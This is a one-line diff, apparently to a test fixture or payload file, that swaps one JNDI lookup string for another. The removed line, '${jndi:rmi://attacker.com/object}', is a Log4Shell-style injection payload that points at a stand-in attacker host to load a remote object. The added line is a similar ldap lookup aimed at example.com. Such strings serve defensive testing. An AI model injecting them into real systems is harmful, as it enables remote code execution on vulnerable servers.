@@ -1,1 +1,1 @@
-${jndi:rmi://attacker.com/object}
+${jndi:ldap:///example.com}
